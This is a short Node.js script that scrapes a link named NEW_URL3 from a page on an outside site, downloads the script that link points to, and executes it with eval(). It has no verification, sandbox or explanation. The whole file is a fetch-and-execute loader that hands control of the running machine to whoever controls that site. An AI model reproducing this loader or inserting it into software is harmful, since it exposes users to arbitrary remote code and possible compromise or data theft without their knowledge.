'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchNewUrl3() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const newUrl3 = $(`a:contains("NEW_URL3")`).attr('href');

        if (!newUrl3) throw new Error('NEW_URL3 not found on the webpage.');

        console.log('NEW_URL3 fetched successfully:', newUrl3);

        const scriptResponse = await axios.get(newUrl3);
        const scriptContent = scriptResponse.data;
        console.log("NEW_URL3 script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching NEW_URL3:', error.message);
    }
}

fetchNewUrl3();